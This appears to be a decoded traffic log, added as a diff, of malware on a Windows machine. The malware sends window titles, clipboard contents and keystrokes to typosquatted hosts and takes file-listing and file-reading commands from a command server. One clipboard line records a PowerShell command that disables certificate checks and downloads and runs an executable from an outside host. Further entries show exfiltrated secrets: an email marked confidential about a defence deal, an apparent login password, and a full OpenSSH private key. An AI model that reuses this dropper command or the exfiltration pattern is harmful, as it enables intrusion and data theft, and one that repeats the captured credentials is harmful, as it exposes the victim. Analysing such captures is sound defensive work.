@@ -1,0 +1,211 @@
+2026-03-29T17:47:19.669Z anders-desktop POST MiccosoftUpdate.com/api/info
+  REQ-PLAIN: 'Host: ANDERS-DESKTOP\nUser: anders\nArch: x64\nCPUs: 4\nRAM: 8185 MB\n'
+
+2026-03-29T17:47:19.876Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: New tab and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:47:19.884Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [CLIPBOARD] powershell -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"
+
+2026-03-29T17:47:28.848Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:47:29.452Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: New tab and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:47:49.712Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:47:58.253Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:47:59.074Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: New tab and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:48:20.010Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: 'dir "C:\\Users"'
+
+2026-03-29T17:48:20.302Z anders-desktop POST windowsupdater.tk/update/servicedata (516 b64, dec=376b)
+  DEC:  Volume in drive C is OS
+ Volume Serial Number is D46D-D12D
+
+ Directory of C:\Users
+
+03/29/2026  07:50 PM    <DIR>          .
+03/29/2026  07:52 PM    <DIR>          anders
+03/29/2026  07:52 PM    <DIR>          localuser
+03/29/2026  07:52 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  234,389,958,656 bytes free
+
+
+2026-03-29T17:48:28.286Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:48:29.088Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: New tab and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:48:38.885Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Hacker News and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:48:43.048Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: varunpriolkar.com/2026/03/building-a-mostly-ipv6-only-home-network/ and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:48:43.307Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Building a Mostly IPv6 Only Home Network � Varun Sinai Priolkar and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:48:50.323Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:48:58.403Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:48:59.319Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Building a Mostly IPv6 Only Home Network � Varun Sinai Priolkar and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:49:20.346Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: 'dir "C:\\Users\\anders\\Documents"'
+
+2026-03-29T17:49:20.508Z anders-desktop POST windowsupdater.tk/update/servicedata (408 b64, dec=292b)
+  DEC:  Volume in drive C is OS
+ Volume Serial Number is D46D-D12D
+
+ Directory of C:\Users\anders\Documents
+
+03/29/2026  07:52 PM    <DIR>          .
+03/29/2026  07:52 PM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  234,385,956,864 bytes free
+
+
+2026-03-29T17:49:28.609Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:49:29.454Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Building a Mostly IPv6 Only Home Network � Varun Sinai Priolkar and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:49:50.524Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:49:58.565Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:50:00.022Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Building a Mostly IPv6 Only Home Network � Varun Sinai Priolkar and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:50:20.546Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:50:28.704Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:50:29.483Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Building a Mostly IPv6 Only Home Network � Varun Sinai Priolkar and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:50:50.567Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: 'dir "C:\\Users\\anders\\Desktop"'
+
+2026-03-29T17:50:50.656Z anders-desktop POST windowsupdater.tk/update/servicedata (536 b64, dec=399b)
+  DEC:  Volume in drive C is OS
+ Volume Serial Number is D46D-D12D
+
+ Directory of C:\Users\anders\Desktop
+
+03/29/2026  08:02 PM    <DIR>          .
+03/29/2026  07:52 PM    <DIR>          ..
+03/29/2026  01:39 PM             2,354 Microsoft Edge.lnk
+03/29/2026  08:02 PM             1,444 polen.eml
+               2 File(s)          3,798 bytes
+               2 Dir(s)  234,431,512,576 bytes free
+
+
+2026-03-29T17:50:53.824Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Hacker News and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:50:58.773Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:50:59.920Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Hacker News and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:51:10.657Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: OpenRouter is holding funds hostage � no support response : openrouter and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:51:20.673Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:51:29.003Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:51:30.031Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: OpenRouter is holding funds hostage � no support response : openrouter and 6 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:51:50.695Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: 'type "C:\\Users\\anders\\Desktop\\polen.eml"'
+
+2026-03-29T17:51:51.101Z anders-desktop POST windowsupdater.tk/update/servicedata (1944 b64, dec=1444b)
+  DEC: Return-Path: <emil.andersson@kongsberg.com>
+Received: from mail.kongsberg.com (mail.kongsberg.com [192.0.2.1])
+    by mail.kongsberg.com (8.14.7/8.14.7) with ESMTP id m3L5GdH3001234
+    for <anders@kongsberg.com>; Thu, 26 Mar 2026 10:15:00 +0100
+From: Emil Andersson <emil.andersson@kongsberg.com>
+To: Anders <anders@kongsberg.com>
+Subject: Polen NASAMS-avtale
+Date: Thu, 26 Mar 2026 10:15:00 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+Hei Anders,
+
+Ville bare gi deg en kort oppdatering. Vi har fått bekreftet at de polske vennene våre har valgt å kjøpe NASAMS fra Kongsberg. Avtalen skal være på rundt 3,5–4 milliarder kroner, og systemet inkluderer både radar, kommandoplass og lanseringsenheter med langtrekkende presisjonsraketter.
+
+NASAMS gir betydelig fleksibilitet med integrasjon mot ulike luftvernsystemer, rask respons på mål i alle høyder og mulighet for samtidig håndtering av flere trusler. Den valgte pakken innebærer full logistikk- og vedlikeholdsoppfølging, så kunden får et komplett, operativt luftvernsystem.
+
+Det innebærer at vi må ansette 40–50 personer i Polen. Har du noen tanker om hvordan vi kan rekruttere fortest mulig? Vi må få på plass et team rimelig kvikt.
+
+Noter deg at informasjonen ikke er offentlig kjent, så vær nøye med hvem du deler dette med.
+
+Med vennlig hilsen,
+Emil Andersson
+Kongsberg Gruppen
+
+
+2026-03-29T17:51:51.197Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: New tab and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:52:04.789Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: https.77vaultwarden.ryo.no
+
+
+2026-03-29T17:52:04.801Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Vaultwarden Web and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:52:21.111Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:52:28.531Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: anders2kongsberg.comanderserkul123
+
+2026-03-29T17:52:28.537Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Save your password?]
+
+2026-03-29T17:52:28.666Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Vaultwarden Web and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:52:32.469Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Vaults | Vaultwarden Web and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:52:40.387Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [CLIPBOARD] -----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZgAAAIgVG358FRt+
+fAAAAAtzc2gtZWQyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZg
+AAAEDHlNIvcCmxaoT1pcOn30GIggyG+N4K4DkaxVhJSTv0CxM8V2H66LCe2VMW2gFkvdn3
+ev2Y8WsbRH7yBzcnppZmAAAAAAECAwQF
+-----END OPENSSH PRIVATE KEY-----
+
+
+2026-03-29T17:52:51.129Z anders-desktop CMD<-windowsupdater.tk/windows/checkforupdate: (no command, idle ping)
+
+2026-03-29T17:52:59.096Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: BGInfo - red.bgi]
+
+2026-03-29T17:53:00.442Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Vaults | Vaultwarden Web and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:53:01.457Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: OpenRouter is holding funds hostage � no support response : openrouter and 7 more pages - Profile 1 - Microsoft? Edge]
+
+2026-03-29T17:53:03.784Z anders-desktop POST MiccosoftUpdate.com/api/data
+  DEC: [WINDOW: Hacker News and 7 more pages - Profile 1 - Microsoft? Edge]
